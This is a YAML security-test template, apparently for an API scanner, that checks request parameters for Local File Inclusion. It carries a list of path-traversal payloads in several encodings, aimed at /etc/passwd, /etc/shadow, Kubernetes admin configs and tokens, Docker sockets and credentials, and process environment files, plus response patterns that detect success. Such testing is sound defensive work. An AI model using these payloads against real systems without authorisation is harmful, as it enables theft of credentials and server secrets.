id: LFI_IN_PARAMETER
info:
  name: "LFI in parameter"
  description: "File path fuzzing in query parameters and request body to identify potential Local File Inclusion vulnerabilities."
  details: >
    "This test examines the presence of file path names in query parameters or request bodies, fuzzing them to identify potential Local File Inclusion vulnerabilities."
    "If exploited, LFI can lead to unauthorized access, information disclosure, server compromise, and execution of malicious code, posing significant risks to the application and its users."
  impact: "Successful exploitation allows an attacker to read arbitrary files on a web server, potentially leading to unauthorized access, information disclosure, server compromise, and execution of malicious code."
  category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
  subCategory: LFI_IN_PARAMETER
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
  cwe:
    - CWE-98
    - CWE-22
  cve:
    - CVE-2022-29597

attributes:
  nature: INTRUSIVE
  plan: STANDARD
  duration: FAST


api_selection_filters:
  method:
    neq: "OPTIONS"
  or:
    - request_payload:
        for_one:
          value:
            regex: ^.*\..{1,4}$
          key:
            extract: file_path
    - query_param:
        for_one:
          value:
            regex: ^.*\..{1,4}$
          key:
            extract: file_path

wordLists:
  filePaths:
    - /etc/passwd
    - /etc/npasswd
    - ..//etc/passwd
    - ../..//etc/passwd
    - ../../..//etc/passwd
    - ../../../..//etc/passwd
    - ../../../../..//etc/passwd
    - ../../../../../..//etc/passwd
    - ..%2f/etc/passwd
    - ..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
    - ..\/etc/passwd
    - ..\..\/etc/passwd
    - ..\..\..\/etc/passwd
    - ..\..\..\..\/etc/passwd
    - ..//etc/passwd
    - 0x2e0x2e//etc/passwd
    - 0x2e0x2e/0x2e0x2e//etc/passwd
    - ..0x2f/etc/passwd
    - ..0x2f..0x2f/etc/passwd
    - ..0x2f..0x2f..0x2f/etc/passwd
    - ..///etc/passwd
    - ..//..///etc/passwd
    - ..//..//..///etc/passwd
    - .\\..\\/etc/passwd
    - .\\..\\.\\..\\/etc/passwd
    - ../../../../../../../../../../../../etc/passwd%00
    - /var/lib/docker/containers/%2e%2e/%2e%2e/%2e%2e/etc/passwd
    - ..%252f..%252f..%252fvar%252flib%252fdocker%252fcontainers
    - ..%5c..%5c..%5cC:%5cWindows%5cMicrosoft.NET%5cFramework%5cv4.0.30319%5cConfig%5cmachine.config
    - ..//..//..//proc/self/environ
    - ..%c0%afdocker.sock
    - ../../../../../../../../../../../../etc/shadow%00
    - ../../../../../../../../../../../../root/.bash_history%00
    - ..//..//..//etc/kubernetes/admin.conf
    - /var/lib/docker/containers
    - /var/lib/docker/containers/*/config.v2.json
    - /var/lib/docker/containers/*/hostconfig.json
    - /root/.docker/config.json
    - /var/run/docker.sock
    - /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token
    - /etc/kubernetes/admin.conf
    - /root/.kube/config
    - /proc/self/environ
    - /proc/self/cmdline
    - /sys/class/net/eth0/address
    - /etc/resolv.conf
    - /var/log/docker.log
    - /var/log/kube-apiserver.log
execute:
  type: single
  requests:
    - req:
        - modify_query_param:
            file_path: ${filePaths}
        - modify_body_param:
            file_path: ${filePaths}

validate:
  response_payload:
    contains_either:
      - "root:x:0:0:"     
      - "daemon:x:"               
      - "/bin/bash"              
      - "/usr/sbin/nologin"      
      - "root:$6$"               
      - "PATH="                 
      - "LANG="                  
      - "SHELL="                
      - "docker_version"          
      - "apiVersion: v1"          
      - "kind: Pod"              
      - "kubernetes-admin@"       
      - "client-certificate-data"                          
      - "shosts.equiv"           
      - "AuthorizedKeysFile"     
      - "/var/log/auth.log"              
      - "127.0.0.1"
    length:
      gt: 0
    not_contains:
      - <html>
      - </html>
